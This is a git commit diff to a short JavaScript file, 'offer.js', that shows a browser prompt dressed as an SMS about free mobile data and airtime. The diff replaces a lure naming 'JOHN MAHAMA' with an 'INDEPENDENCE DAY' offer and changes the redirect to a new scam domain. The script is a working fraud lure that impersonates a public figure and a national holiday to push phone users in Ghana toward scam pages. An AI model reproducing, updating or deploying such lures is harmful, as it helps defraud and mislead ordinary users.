b1340056777673b0da895d29c4e2036ca233f038
essac5523me <essac5523+me@gmail.com>
2025-03-04 01:56:13 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20GB + GH₵50 Airtime'
+password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 20GB Free Data INDEPENDENCE DAY Offer, Kindly Press OK to ACTIVATE ','20GB + GH₵50 Airtime');
+if (password != '20GB + GH₵50 Airtime') {
+location.href='https://gh-independence.4g-data.info/20GB';
 }
